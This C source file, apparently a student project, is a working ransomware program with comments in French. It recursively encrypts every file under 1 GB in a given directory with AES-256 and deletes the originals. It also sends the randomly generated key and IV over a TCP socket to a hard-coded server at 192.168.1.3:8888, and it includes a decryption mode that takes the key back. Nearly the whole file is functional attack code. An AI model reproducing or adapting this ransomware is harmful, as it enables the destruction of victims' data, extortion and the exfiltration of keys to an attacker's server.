#include "ransomlib.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dirent.h>
// pour les sockets
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>

// pour la taille des fichiers
#include <sys/stat.h>

#define TRUE 0
#define ENCRYPT_FLAG 0
#define DECRYPT_FLAG 1
//1 073 741 824 octets = 1GB
#define SIZE_LIMITE 1073741824 

void usage();

int is_encrypted(char *filename);

void listdir( const char *name, unsigned char *iv, unsigned char *key, char de_flag);

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);

int send_key(char *pKey, char *pIv);


int main (int argc, char * argv[])
{
	
	if (argc == 2 ) {
		char * name = argv[1];
		unsigned char iv[AES_BLOCK_SIZE * sizeof(char)];
		unsigned char key[AES_256_KEY_SIZE * sizeof(char)];
		char pIv[AES_BLOCK_SIZE * 2 * sizeof(char)];
		char pKey[AES_256_KEY_SIZE * 2 * sizeof(char)];

		generate_key(key,AES_256_KEY_SIZE, iv, AES_BLOCK_SIZE, pKey, pIv);
		send_key(pKey,pIv);
		listdir(name,iv,key,ENCRYPT_FLAG);

		memset(iv, 0, AES_BLOCK_SIZE * sizeof(char));
		memset(key, 0, AES_256_KEY_SIZE * sizeof(char));
		memset(pIv, 0, AES_BLOCK_SIZE * 2 * sizeof(char));
		memset(pKey, 0, AES_256_KEY_SIZE * 2 * sizeof(char));
	} else {
		//
		// ./ransom DIRECTORY -d KEY IV
		//
		if (argc == 5 && strcmp(argv[2],"-d") == 0) {
			char * name = argv[1];
			char * pKey = argv[3];
			char * pIv = argv[4];

			unsigned char iv[AES_BLOCK_SIZE * sizeof(char)];
			unsigned char key[AES_256_KEY_SIZE * sizeof(char)];

			hexa_to_bytes(pIv,iv,AES_BLOCK_SIZE);
			hexa_to_bytes(pKey,key,AES_256_KEY_SIZE);
			
			listdir(name,iv,key,DECRYPT_FLAG);
		} else {
			usage();
		}
	}
	
}

//affiche l'aide
void usage(){
	printf("Projet Ransomware Kyllian Louis \n\
	Utilisation : \n\
	\transom [DIRECTORY]\tutilisé pour chiffrer le dossier donné en argument.\n\
	\transom [DIRECTORY] -d [KEY] [IV]\tutilisé pour déchiffrer le dossier donné en argument.\n\
	\transom\tdonné sans argument ou lors d'un appel invalide fait apparaitre ce menu.");
}

/*	in : filename
*	out : TRUE (0) = encrypted .. FALSE (-1) = non_encrypted
*	
*	vérifie uniquement si l'extension du fichier est ENCRYPT_EXT ou non
*/

int is_encrypted(char *filename){

	char * extension = strrchr(filename, '.');
	if (extension != NULL && strcmp(extension + 1, ENCRYPT_EXT) == 0) {
		return 0;
	}
	return -1;
}

/*	in : nom du répertoire, vecteur d'initialisation, clé de chiffrement, drapeau avec la valeur ENCRYPT_FLAG ou DECRYPT_FLAG
*	out : /
*
*	!!! appele recursive : parcourt l'arborescence des fichiers
*/
void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag){
	DIR *dir = opendir(name);
	if (dir != NULL) {
		
		struct dirent *directoryStruct = readdir(dir);
		while(directoryStruct  != NULL) {
			if(	strcmp(directoryStruct->d_name,".") != 0 
				&& strcmp(directoryStruct->d_name,"..") != 0
			) {
				char *namesub = (char*)malloc((strlen(name) + 2 + strlen(directoryStruct->d_name) )*sizeof(char));
				if (namesub != NULL) {
					sprintf(namesub, "%s/%s", name, directoryStruct->d_name);
					if (directoryStruct->d_type == DT_DIR) {
						listdir(namesub,iv,key,de_flag);
							
					} else {
						struct stat sb;
						switch(de_flag) {
							case ENCRYPT_FLAG : 
									stat(namesub, &sb);
									if(is_encrypted(namesub) != TRUE && sb.st_size < SIZE_LIMITE ){
										encrypt(key,iv,namesub);
										remove (namesub);
									}
									break;
							case DECRYPT_FLAG : 
									if(is_encrypted(namesub)== TRUE){
										decrypt(key,iv,namesub);
										remove(namesub);
									}
									break;
							default : printf("Appel illégitime.\n");
						}
					}
					printf("%s\n",namesub);
					free(namesub);
				} else {
					printf("Surcharge mémoire.\n");
				}
			}
			directoryStruct = readdir(dir);
		}
		closedir(dir);
	}
	else {
		printf("Erreur, répertoire inconnu.");
	}
}

/*	in : *key où sera stockée la clé (format binaire), taille de la clé,
* iv où sera stocké le vecteur d'initialisation (format binaire), taille du vecteur d'initialisation,
* pKey où sera stockée la clé (format hexa), *pIv où sera stocké le vecteur d'initialisation (format hexa)
* out : génère la clé et le vecteur d'initialisation de manière pseudo-aléatoire (aux formats binaire et hexa)
*/
int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv){

	RAND_bytes(key, sizeKey);
	RAND_bytes(iv, sizeIv);

	bytes_to_hexa(iv,pIv,sizeIv);
	bytes_to_hexa(key,pKey,sizeKey);
	return 0;

}

/*	in : *pkey adresse au format hexa key, *pIv adresse au format hexa init vector
*	out : /
*	Envoie la clé/IV via une prise
*
*   code fait par Denis 
*/
int send_key(char *pKey, char *pIv){
	char msg[4096];
	sprintf(msg,"KEY : %s\nIV : %s\n",pKey,pIv);
	int sockid;
	int server_port= 8888;
	char *server_ip = "192.168.1.3";
	sockid = socket(AF_INET,SOCK_STREAM,0);
	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(server_port);
	server_addr.sin_addr.s_addr = inet_addr(server_ip);
	connect(sockid,(struct sockaddr *)&server_addr, sizeof(server_addr));
	send(sockid,(const char *)msg, strlen(msg),0);
	close(sockid);
	memset(msg,0,BUFSIZE);
	return 0;
}
